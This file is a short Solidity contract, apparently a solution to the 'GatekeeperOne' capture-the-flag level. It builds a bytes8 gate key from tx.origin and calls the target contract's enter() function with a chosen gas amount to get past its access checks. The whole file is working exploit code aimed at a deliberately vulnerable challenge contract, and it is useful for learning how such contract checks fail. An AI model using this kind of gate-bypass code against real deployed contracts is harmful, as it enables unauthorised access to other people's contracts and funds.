// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Gatakeeperone.sol";

contract GatekeeperOneAttack {
    GatekeeperOne victim;

   

    function attack(address _address, uint256 gas) public {
        victim = GatekeeperOne(_address);
        uint16 pass16 = uint16(uint160(tx.origin));
        uint64 pass64 = uint64(1 << 63) + pass16;
        bytes8 gatekey = bytes8(pass64);

        require(gas < 8191, "gas>8191");
        require(victim.enter{gas: 8191 * 10 + gas}(gatekey), "it failed");
    }
}
